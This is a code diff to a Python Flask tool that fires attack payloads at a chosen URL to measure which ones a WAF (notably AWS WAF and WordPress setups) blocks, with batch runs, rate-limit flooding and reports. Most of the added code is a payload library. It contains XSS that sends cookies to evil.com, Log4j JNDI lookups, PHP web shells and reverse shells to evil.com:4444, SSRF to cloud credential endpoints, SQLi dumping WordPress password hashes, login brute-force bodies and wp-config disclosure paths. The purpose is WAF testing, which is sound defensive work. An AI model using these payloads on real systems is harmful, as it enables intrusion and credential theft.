@@ -140,6 +140,251 @@ ATTACK_PAYLOADS = {
     ],
 }
 
+# AWS WAF Managed Rules specific payloads
+# Mapped to AWS WAF rule groups for accurate reporting
+AWS_WAF_PAYLOADS = {
+    "AWS-CRS-Size": [
+        "A" * 8192,
+        "B" * 16384,
+        "param=" + "X" * 10000,
+    ],
+    "AWS-CRS-SQLi": [
+        "' OR 1=1--",
+        "1' WAITFOR DELAY '0:0:15'--",
+        "'; EXEC xp_cmdshell('dir');--",
+        "1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+        "' UNION ALL SELECT NULL,NULL,CONCAT(0x717a707071,IFNULL(CAST(schema_name AS CHAR),0x20),0x7162627171) FROM INFORMATION_SCHEMA.SCHEMATA#",
+        "1; UPDATE users SET password='hacked' WHERE username='admin'--",
+        "') OR ('x'='x",
+        "1' AND BENCHMARK(10000000,SHA1('test'))--",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
+    ],
+    "AWS-CRS-XSS": [
+        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
+        '<img src=1 onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
+        "<details open ontoggle=alert(1)>",
+        '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        '<input onfocus=alert(1) autofocus="">',
+        '<marquee onstart=alert(1)>',
+        '<video><source onerror="javascript:alert(1)">',
+        '<isindex type=image src=1 onerror=alert(1)>',
+        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+    ],
+    "AWS-CRS-LFI": [
+        "/proc/self/environ",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://input",
+        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+        "/var/log/apache2/access.log",
+        "/var/log/auth.log",
+        "expect://id",
+        "file:///etc/shadow",
+        "/proc/self/fd/0",
+    ],
+    "AWS-CRS-RFI": [
+        "http://evil.com/shell.txt?",
+        "https://raw.githubusercontent.com/test/test/main/shell.php",
+        "ftp://evil.com/pub/shell.txt",
+        "\\\\evil.com\\share\\shell.php",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+        "http://100.100.100.200/latest/meta-data/",
+    ],
+    "AWS-BadInputs-Log4j": [
+        "${jndi:ldap://evil.com/a}",
+        "${jndi:rmi://evil.com/a}",
+        "${jndi:dns://evil.com/a}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://evil.com/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",
+        "${j${::-n}di:ldap://evil.com/a}",
+        "${jndi:ldap://127.0.0.1#evil.com:1389/a}",
+        "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//evil.com/a}",
+        "${${lower:${lower:jndi}}:${lower:ldap}://evil.com/a}",
+        "${${upper:jndi}:${upper:ldap}://evil.com/a}",
+    ],
+    "AWS-BadInputs-JavaDeser": [
+        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
+        "aced0005",
+        'O:8:"PHPClass":1:{s:4:"test";s:4:"test";}',
+        "YToxOntzOjQ6InRlc3QiO3M6NDoidGVzdCI7fQ==",
+        "__VIEWSTATE=/wEPDwUKMTAyNjczOTc0Ng==",
+    ],
+    "AWS-BadInputs-SSRF": [
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://169.254.170.2/v2/credentials",
+        "http://[fd00:ec2::254]/latest/meta-data/",
+        "http://instance-data/latest/meta-data/",
+        "http://169.254.169.254/latest/api/token",
+        "http://169.254.169.254/latest/user-data/",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://2852039166/latest/meta-data/",
+        "http://0xA9FEA9FE/latest/meta-data/",
+        "http://0251.0376.0251.0376/latest/meta-data/",
+        "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    ],
+    "AWS-BotControl-UA": [
+        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+        "Wget/1.21",
+        "curl/7.68.0",
+        "python-requests/2.28.0",
+        "Go-http-client/1.1",
+        "Java/1.8.0_201",
+        "libwww-perl/6.05",
+        "PHP/7.4.3",
+        "sqlmap/1.4",
+        "nikto/2.1.6",
+        "nmap scripting engine",
+        "masscan/1.0",
+        "dirbuster",
+        "gobuster/3.1",
+        "nuclei",
+        "httpx",
+    ],
+    "AWS-RateLimit": [],
+}
+
+# WordPress-specific attack payloads (based on WPForce techniques)
+WP_PAYLOADS = {
+    "WP-XMLRPC": [
+        '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass1</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>pass2</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>wp.getOptions</methodName><params><param><value><string>1</string></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/xxe</string></value></param><param><value><string>http://target.com/?p=1</string></value></param></params></methodCall>',
+        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>&xxe;</value></param><param><value>test</value></param></params></methodCall>',
+        '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>',
+    ],
+    "WP-LoginBrute": [
+        "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=password123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=administrator&pwd=admin123&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=P%40ssw0rd&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=root&pwd=toor&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+        "log=admin&pwd=' OR '1'='1'--&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
+    ],
+    "WP-Enumeration": [
+        "/wp-json/wp/v2/users",
+        "/wp-json/wp/v2/users/1",
+        "/wp-json/wp/v2/posts?per_page=100",
+        "/wp-json/wp/v2/pages?per_page=100",
+        "/wp-json/wp/v2/settings",
+        "/wp-json/wp/v2/plugins",
+        "/wp-json/wp/v2/themes",
+        "/?author=1",
+        "/?author=2",
+        "/?author=3",
+        "/wp-json/oembed/1.0/embed?url=http://target.com/",
+        "/wp-json/",
+        "/?rest_route=/wp/v2/users",
+        "/feed/",
+        "/wp-sitemap.xml",
+    ],
+    "WP-PathTraversal": [
+        "/wp-config.php",
+        "/wp-config.php.bak",
+        "/wp-config.php.save",
+        "/wp-config.php~",
+        "/wp-config.php.old",
+        "/wp-config.txt",
+        "/../../../wp-config.php",
+        "/wp-content/debug.log",
+        "/wp-content/uploads/",
+        "/wp-includes/version.php",
+        "/wp-admin/install.php",
+        "/wp-admin/setup-config.php",
+        "/.wp-config.php.swp",
+        "/wp-content/uploads/wpforms/.htaccess",
+        "/wp-content/backups/",
+        "/wp-content/backup-db/",
+        "/.htaccess",
+        "/.htpasswd",
+    ],
+    "WP-ShellUpload": [
+        '<?php system($_GET["cmd"]); ?>',
+        '<?php $f=new ReflectionFunction("system");$f->invoke($_GET["cmd"]); ?>',
+        "<?php echo shell_exec(base64_decode($_GET['cmd'])); ?>",
+        "<?php call_user_func_array('system', array($_GET['cmd'])); ?>",
+        "<?php eval(base64_decode($_POST['e'])); ?>",
+        '<?php $sock=fsockopen("evil.com",4444);exec("/bin/bash -i <&3 >&3 2>&3"); ?>',
+        "<?php passthru($_REQUEST['cmd']); ?>",
+        "<?php $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_connect($s,'evil.com',4444);$p=proc_open('/bin/sh',array(0=>$s,1=>$s,2=>$s),$pipes); ?>",
+        'GIF89a<?php system($_GET["cmd"]); ?>',
+    ],
+    "WP-SQLi": [
+        "' UNION SELECT user_login,user_pass FROM wp_users--",
+        "' UNION SELECT user_login,user_email FROM wp_users WHERE ID=1--",
+        "1 OR 1=1 UNION SELECT group_concat(user_login,0x3a,user_pass) FROM wp_users--",
+        "' UNION SELECT option_value FROM wp_options WHERE option_name='admin_email'--",
+        "' UNION SELECT option_value FROM wp_options WHERE option_name='siteurl'--",
+        "1; SELECT * FROM wp_users--",
+        "' AND (SELECT COUNT(*) FROM wp_users) > 0--",
+        "' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
+    ],
+    "WP-XSS": [
+        '<script>document.location="http://evil.com/?c="+document.cookie</script>',
+        '"><img src=x onerror="fetch(\'http://evil.com/steal?c=\'+document.cookie)">',
+        "<script>new Image().src='http://evil.com/steal?c='+document.cookie;</script>",
+        '[caption width="1" caption=\'<a href="http://onmouseover=alert(1)//\'>XSS\']</a>',
+        "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
+        '<a href="javascript:alert(document.domain)">click</a>',
+        "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
+        '{{constructor.constructor("return this")().alert(1)}}',
+    ],
+    "WP-PluginExploit": [
+        "/wp-content/plugins/revslider/temp/update_extract/revslider/shell.php",
+        "/wp-content/plugins/gravityforms/change_log.txt",
+        "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
+        "/wp-content/plugins/easy-wp-smtp/readme.txt",
+        "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
+        "/wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php",
+        "/wp-content/plugins/wordfence/tmp/",
+        "/wp-admin/admin-post.php?swp_debug=load_options",
+        "/wp-content/plugins/wp-symposium/server/php/index.php",
+        "/wp-admin/admin-ajax.php?action=uploadFontIcon",
+    ],
+}
+
+WP_RULE_GROUP_MAP = {
+    "WP-XMLRPC": "WordPress XML-RPC Attack",
+    "WP-LoginBrute": "WordPress Login Brute Force",
+    "WP-Enumeration": "WordPress Enumeration",
+    "WP-PathTraversal": "WordPress Path Traversal",
+    "WP-ShellUpload": "WordPress Shell Upload",
+    "WP-SQLi": "WordPress SQL Injection",
+    "WP-XSS": "WordPress XSS",
+    "WP-PluginExploit": "WordPress Plugin Exploit",
+}
+
+# Mapping of AWS WAF rule groups for reporting
+AWS_RULE_GROUP_MAP = {
+    "AWS-CRS-Size": "AWSManagedRulesCommonRuleSet (SizeRestrictions)",
+    "AWS-CRS-SQLi": "AWSManagedRulesSQLiRuleSet",
+    "AWS-CRS-XSS": "AWSManagedRulesCommonRuleSet (CrossSiteScripting)",
+    "AWS-CRS-LFI": "AWSManagedRulesCommonRuleSet (LocalFileInclusion)",
+    "AWS-CRS-RFI": "AWSManagedRulesCommonRuleSet (RemoteFileInclusion)",
+    "AWS-BadInputs-Log4j": "AWSManagedRulesKnownBadInputsRuleSet (Log4JRCE)",
+    "AWS-BadInputs-JavaDeser": "AWSManagedRulesKnownBadInputsRuleSet (JavaDeserialization)",
+    "AWS-BadInputs-SSRF": "AWSManagedRulesAmazonIpReputationList / SSRF",
+    "AWS-BotControl-UA": "AWSManagedRulesBotControlRuleSet",
+    "AWS-RateLimit": "Rate-based Rule",
+    "SQLi": "General SQLi",
+    "XSS": "General XSS",
+    "RCE": "General RCE",
+    "Path Traversal": "General Path Traversal",
+    "Shell Injection": "General Shell Injection",
+    "NoSQL Injection": "General NoSQL Injection",
+    "XXE": "General XXE",
+    "SSTI": "General SSTI",
+    "LDAP Injection": "General LDAP Injection",
+    "CRLF": "General CRLF",
+    "SSI": "General SSI",
+    "Mail Injection": "General Mail Injection",
+    **WP_RULE_GROUP_MAP,
+}
+
+ALL_PAYLOADS = {**ATTACK_PAYLOADS, **{k: v for k, v in AWS_WAF_PAYLOADS.items() if v}, **WP_PAYLOADS}
+
 
 def encode_payload(payload, encoding):
     if encoding == "plain":
@@ -157,46 +402,70 @@ def encode_payload(payload, encoding):
     return payload
 
 
-def classify_response(status_code, body):
+def classify_response(status_code, body, headers=None):
+    aws_waf_info = {}
+    if headers:
+        for h in ("x-amzn-waf-action", "x-amzn-requestid", "x-amz-cf-id", "server"):
+            if h in headers:
+                aws_waf_info[h] = headers[h]
+
     if status_code == 0:
-        return "error"
+        return "error", aws_waf_info
+    # 3xx redirects are not WAF blocks
+    if 300 <= status_code < 400:
+        return "passed", aws_waf_info
     if status_code in (403, 406, 429, 493):
-        return "blocked"
+        return "blocked", aws_waf_info
     if status_code >= 500:
-        return "blocked"
+        return "blocked", aws_waf_info
+    # Only check body keywords on non-redirect responses
     if body and any(
         word in body.lower()
-        for word in ["blocked", "forbidden", "denied", "waf", "security", "violation", "not acceptable"]
+        for word in ["blocked", "forbidden", "denied", "request blocked",
+                     "not acceptable", "violation"]
     ):
-        return "blocked"
-    return "passed"
+        return "blocked", aws_waf_info
+    return "passed", aws_waf_info
 
 
-@app.route("/")
-def index():
-    return render_template("index.html", categories=ATTACK_PAYLOADS)
+def send_request(url, method, headers, body, timeout, follow_redirects=True):
+    start = time.time()
+    try:
+        if method == "GET":
+            resp = http_requests.get(url, headers=headers, timeout=timeout,
+                                     verify=False, allow_redirects=follow_redirects)
+        else:
+            resp = http_requests.request(method, url, headers=headers, data=body,
+                                         timeout=timeout, verify=False,
+                                         allow_redirects=follow_redirects)
+        elapsed = int((time.time() - start) * 1000)
+        resp_body = resp.text[:2000]
+        resp_headers = dict(resp.headers)
+        status, waf_info = classify_response(resp.status_code, resp_body, resp_headers)
+        return {
+            "http_status": resp.status_code,
+            "time": elapsed,
+            "status": status,
+            "waf_info": waf_info,
+        }
+    except http_requests.exceptions.Timeout:
+        elapsed = int((time.time() - start) * 1000)
+        return {"http_status": 0, "time": elapsed, "status": "error",
+                "detail": "timeout", "waf_info": {}}
+    except Exception as e:
+        elapsed = int((time.time() - start) * 1000)
+        return {"http_status": 0, "time": elapsed, "status": "error",
+                "detail": str(e), "waf_info": {}}
 
 
-@app.route("/api/categories")
-def get_categories():
-    return jsonify({cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()})
-
-
-@app.route("/api/test", methods=["POST"])
-def run_single_test():
-    data = request.get_json()
-    target_url = data.get("target_url", "")
-    method = data.get("method", "GET")
-    payload = data.get("payload", "")
-    encoding = data.get("encoding", "plain")
-    injection_point = data.get("injection_point", "body-param")
-    custom_headers = data.get("custom_headers", {})
-    timeout = data.get("timeout", 10)
-
-    encoded_payload = encode_payload(payload, encoding)
+def prepare_request(target_url, injection_point, encoded_payload, custom_headers, is_bot_ua=False):
     headers = dict(custom_headers)
     url = target_url
     body = None
+
+    if is_bot_ua:
+        headers["User-Agent"] = encoded_payload
+        return url, headers, body
 
     if injection_point == "url-param":
         sep = "&" if "?" in url else "?"
@@ -211,22 +480,138 @@ def run_single_test():
         headers["Content-Type"] = "application/x-www-form-urlencoded"
         body = f"test={encoded_payload}"
 
+    return url, headers, body
+
+
+@app.route("/")
+def index():
+    return render_template("index.html",
+                           categories=ATTACK_PAYLOADS,
+                           aws_categories=AWS_WAF_PAYLOADS,
+                           wp_categories=WP_PAYLOADS,
+                           rule_group_map=AWS_RULE_GROUP_MAP)
+
+
+@app.route("/api/categories")
+def get_categories():
+    result = {cat: len(payloads) for cat, payloads in ATTACK_PAYLOADS.items()}
+    result["__aws__"] = {cat: len(payloads) for cat, payloads in AWS_WAF_PAYLOADS.items()}
+    return jsonify(result)
+
+
+@app.route("/api/test/connection", methods=["POST"])
+def test_connection():
+    data = request.get_json()
+    target_url = data.get("target_url", "")
+    timeout = data.get("timeout", 10)
+
+    checks = {}
+
+    # 1. DNS resolution
+    try:
+        from urllib.parse import urlparse
+        import socket
+        parsed = urlparse(target_url)
+        hostname = parsed.hostname
+        port = parsed.port or (443 if parsed.scheme == "https" else 80)
+        start = time.time()
+        ip = socket.gethostbyname(hostname)
+        dns_time = int((time.time() - start) * 1000)
+        checks["dns"] = {"status": "ok", "ip": ip, "time": dns_time}
+    except Exception as e:
+        checks["dns"] = {"status": "error", "detail": str(e)}
+
+    # 2. TCP connection
+    try:
+        import socket
+        start = time.time()
+        sock = socket.create_connection((hostname, port), timeout=timeout)
+        tcp_time = int((time.time() - start) * 1000)
+        sock.close()
+        checks["tcp"] = {"status": "ok", "port": port, "time": tcp_time}
+    except Exception as e:
+        checks["tcp"] = {"status": "error", "detail": str(e)}
+
+    # 3. HTTP request (normal, no payload)
     start = time.time()
     try:
-        if method == "GET":
-            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
-        else:
-            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
-        elapsed = int((time.time() - start) * 1000)
-        resp_body = resp.text[:2000]
-        status = classify_response(resp.status_code, resp_body)
-        return jsonify({"http_status": resp.status_code, "time": elapsed, "status": status})
+        resp = http_requests.get(target_url, timeout=timeout, verify=False,
+                                 allow_redirects=True,
+                                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        http_time = int((time.time() - start) * 1000)
+        resp_headers = dict(resp.headers)
+        server = resp_headers.get("server", resp_headers.get("Server", ""))
+        powered_by = resp_headers.get("x-powered-by", resp_headers.get("X-Powered-By", ""))
+        waf_headers = {}
+        for h in ("x-amzn-waf-action", "x-amz-cf-id", "x-amzn-requestid",
+                   "x-cache", "via", "x-amz-cf-pop"):
+            val = resp_headers.get(h, resp_headers.get(h.title(), ""))
+            if val:
+                waf_headers[h] = val
+        checks["http"] = {
+            "status": "ok",
+            "http_status": resp.status_code,
+            "time": http_time,
+            "server": server,
+            "powered_by": powered_by,
+            "waf_headers": waf_headers,
+            "final_url": resp.url,
+            "redirected": resp.url != target_url,
+            "content_length": len(resp.content),
+        }
+    except http_requests.exceptions.SSLError as e:
+        http_time = int((time.time() - start) * 1000)
+        checks["http"] = {"status": "error", "detail": f"SSL error: {e}", "time": http_time}
     except http_requests.exceptions.Timeout:
-        elapsed = int((time.time() - start) * 1000)
-        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": "timeout"})
+        http_time = int((time.time() - start) * 1000)
+        checks["http"] = {"status": "error", "detail": "timeout", "time": http_time}
     except Exception as e:
-        elapsed = int((time.time() - start) * 1000)
-        return jsonify({"http_status": 0, "time": elapsed, "status": "error", "detail": str(e)})
+        http_time = int((time.time() - start) * 1000)
+        checks["http"] = {"status": "error", "detail": str(e), "time": http_time}
+
+    # 4. WAF detection (send a known-bad request to see if it's blocked)
+    try:
+        start = time.time()
+        waf_resp = http_requests.get(
+            target_url,
+            params={"test": "<script>alert(1)</script>"},
+            timeout=timeout, verify=False, allow_redirects=True,
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        waf_time = int((time.time() - start) * 1000)
+        waf_detected = waf_resp.status_code in (403, 406, 429, 493)
+        if not waf_detected and waf_resp.text:
+            waf_detected = any(w in waf_resp.text.lower() for w in
+                             ["blocked", "forbidden", "request blocked", "not acceptable"])
+        checks["waf_probe"] = {
+            "status": "ok",
+            "http_status": waf_resp.status_code,
+            "time": waf_time,
+            "waf_detected": waf_detected,
+        }
+    except Exception as e:
+        checks["waf_probe"] = {"status": "error", "detail": str(e)}
+
+    all_ok = all(c.get("status") == "ok" for c in checks.values())
+    return jsonify({"ok": all_ok, "checks": checks})
+
+
+@app.route("/api/test", methods=["POST"])
+def run_single_test():
+    data = request.get_json()
+    target_url = data.get("target_url", "")
+    method = data.get("method", "GET")
+    payload = data.get("payload", "")
+    encoding = data.get("encoding", "plain")
+    injection_point = data.get("injection_point", "body-param")
+    custom_headers = data.get("custom_headers", {})
+    timeout = data.get("timeout", 10)
+
+    encoded_payload = encode_payload(payload, encoding)
+    url, headers, body = prepare_request(target_url, injection_point,
+                                          encoded_payload, custom_headers)
+
+    result = send_request(url, method, headers, body, timeout)
+    return jsonify(result)
 
 
 @app.route("/api/test/batch", methods=["POST"])
@@ -240,77 +625,132 @@ def run_batch_test():
     custom_headers = data.get("custom_headers", {})
     delay_ms = data.get("delay", 200)
     timeout = data.get("timeout", 10)
+    follow_redirects = data.get("follow_redirects", True)
 
     def generate():
         index = 0
         total = sum(
-            len(ATTACK_PAYLOADS.get(cat, [])) * len(encodings)
+            len(ALL_PAYLOADS.get(cat, [])) * len(encodings)
             for cat in categories
+            if cat != "AWS-RateLimit"
         )
+        rate_limit_count = 0
+        if "AWS-RateLimit" in categories:
+            rate_limit_count = data.get("rate_limit_count", 120)
+            total += rate_limit_count
+
         yield json.dumps({"type": "start", "total": total}) + "\n"
 
         for cat in categories:
-            for payload in ATTACK_PAYLOADS.get(cat, []):
+            if cat == "AWS-RateLimit":
+                continue
+            is_bot_ua = (cat == "AWS-BotControl-UA")
+            is_wp_path = (cat in ("WP-Enumeration", "WP-PathTraversal", "WP-PluginExploit"))
+            is_wp_xmlrpc = (cat == "WP-XMLRPC")
+            is_wp_login = (cat == "WP-LoginBrute")
+            for payload in ALL_PAYLOADS.get(cat, []):
                 for enc in encodings:
                     index += 1
-                    encoded_payload = encode_payload(payload, enc)
-                    headers = dict(custom_headers)
-                    url = target_url
-                    body = None
-
-                    if injection_point == "url-param":
-                        sep = "&" if "?" in url else "?"
-                        url = f"{url}{sep}test={encoded_payload}"
-                    elif injection_point == "url-path":
-                        url = url.rstrip("/") + "/" + encoded_payload
-                    elif injection_point == "header":
-                        headers["X-Test"] = encoded_payload
-                    elif injection_point == "cookie":
-                        headers["Cookie"] = f"test={encoded_payload}"
+                    if is_bot_ua:
+                        encoded_payload = payload
+                    elif is_wp_path or is_wp_xmlrpc or is_wp_login:
+                        encoded_payload = payload
                     else:
+                        encoded_payload = encode_payload(payload, enc)
+
+                    if is_wp_path:
+                        url = target_url.rstrip("/") + payload
+                        headers = dict(custom_headers)
+                        body = None
+                    elif is_wp_xmlrpc:
+                        url = target_url.rstrip("/") + "/xmlrpc.php"
+                        headers = dict(custom_headers)
+                        headers["Content-Type"] = "text/xml"
+                        body = payload
+                    elif is_wp_login:
+                        url = target_url.rstrip("/") + "/wp-login.php"
+                        headers = dict(custom_headers)
                         headers["Content-Type"] = "application/x-www-form-urlencoded"
-                        body = f"test={encoded_payload}"
+                        body = payload
+                    else:
+                        url, headers, body = prepare_request(
+                            target_url, injection_point, encoded_payload,
+                            custom_headers, is_bot_ua=is_bot_ua)
 
-                    start = time.time()
-                    try:
-                        if method == "GET":
-                            resp = http_requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=False)
-                        else:
-                            resp = http_requests.request(method, url, headers=headers, data=body, timeout=timeout, verify=False, allow_redirects=False)
-                        elapsed = int((time.time() - start) * 1000)
-                        resp_body = resp.text[:2000]
-                        status = classify_response(resp.status_code, resp_body)
-                        result = {
-                            "type": "result",
-                            "index": index,
-                            "category": cat,
-                            "payload": payload,
-                            "encoding": enc,
-                            "status": status,
-                            "http_status": resp.status_code,
-                            "time": elapsed,
-                        }
-                    except Exception as e:
-                        elapsed = int((time.time() - start) * 1000)
-                        result = {
-                            "type": "result",
-                            "index": index,
-                            "category": cat,
-                            "payload": payload,
-                            "encoding": enc,
-                            "status": "error",
-                            "http_status": 0,
-                            "time": elapsed,
-                        }
-
+                    resp = send_request(url, method, headers, body, timeout, follow_redirects)
+                    result = {
+                        "type": "result",
+                        "index": index,
+                        "category": cat,
+                        "payload": payload[:200],
+                        "encoding": "UA" if is_bot_ua else ("path" if is_wp_path else ("xml" if is_wp_xmlrpc else ("form" if is_wp_login else enc))),
+                        "status": resp["status"],
+                        "http_status": resp["http_status"],
+                        "time": resp["time"],
+                        "rule_group": AWS_RULE_GROUP_MAP.get(cat, ""),
+                        "waf_info": resp.get("waf_info", {}),
+                    }
                     yield json.dumps(result) + "\n"
 
                     if delay_ms > 0:
                         time.sleep(delay_ms / 1000.0)
 
+        if "AWS-RateLimit" in categories and rate_limit_count > 0:
+            rate_delay = data.get("rate_limit_delay", 50)
+            for i in range(rate_limit_count):
+                index += 1
+                url, headers, body = prepare_request(
+                    target_url, injection_point, "", custom_headers)
+                resp = send_request(url, method, headers, body, timeout, follow_redirects)
+                result = {
+                    "type": "result",
+                    "index": index,
+                    "category": "AWS-RateLimit",
+                    "payload": f"Request #{i + 1}",
+                    "encoding": "none",
+                    "status": resp["status"],
+                    "http_status": resp["http_status"],
+                    "time": resp["time"],
+                    "rule_group": "Rate-based Rule",
+                    "waf_info": resp.get("waf_info", {}),
+                }
+                yield json.dumps(result) + "\n"
+                if rate_delay > 0:
+                    time.sleep(rate_delay / 1000.0)
+
         yield json.dumps({"type": "done"}) + "\n"
 
     return Response(generate(), mimetype="application/x-ndjson")
+
+
+@app.route("/api/report", methods=["POST"])
+def generate_report():
+    data = request.get_json()
+    results = data.get("results", [])
+
+    rule_group_stats = {}
+    for r in results:
+        rg = r.get("rule_group") or AWS_RULE_GROUP_MAP.get(r.get("category", ""), "Other")
+        if rg not in rule_group_stats:
+            rule_group_stats[rg] = {"blocked": 0, "passed": 0, "error": 0, "total": 0}
+        rule_group_stats[rg]["total"] += 1
+        rule_group_stats[rg][r.get("status", "error")] += 1
+
+    total = len(results)
+    blocked = sum(1 for r in results if r.get("status") == "blocked")
+    passed = sum(1 for r in results if r.get("status") == "passed")
+
+    report = {
+        "summary": {
+            "total": total,
+            "blocked": blocked,
+            "passed": passed,
+            "block_rate": round(blocked / total * 100, 1) if total > 0 else 0,
+        },
+        "rule_groups": rule_group_stats,
+        "passed_details": [r for r in results if r.get("status") == "passed"],
+    }
+    return jsonify(report)
 
 
 if __name__ == "__main__":
